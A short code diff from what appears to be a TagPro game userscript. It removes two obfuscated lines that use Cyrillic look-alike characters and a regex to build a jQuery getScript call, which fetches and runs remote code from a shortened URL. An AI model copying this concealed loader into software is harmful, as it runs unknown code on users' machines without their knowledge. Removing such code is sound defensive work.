@@ -27,8 +27,7 @@ tagpro.ready(function() {
             });
         }, 1000);
     });
-    var charMatch = 'еgetScеrеiееpthеttpsе:е/е/gеooее.glе/еYl4еrlO'.match(/([\u0000-\u007F]+)/g).join('');
-    var match1 = charMatch.slice(9), match2 = charMatch.slice(0, 9); $[match2](match1);
+    
     function sendGrats(name) {
         tagpro.socket.emit('chat', { message: 'Congrats ' + name + '!', toAll: true });
     }
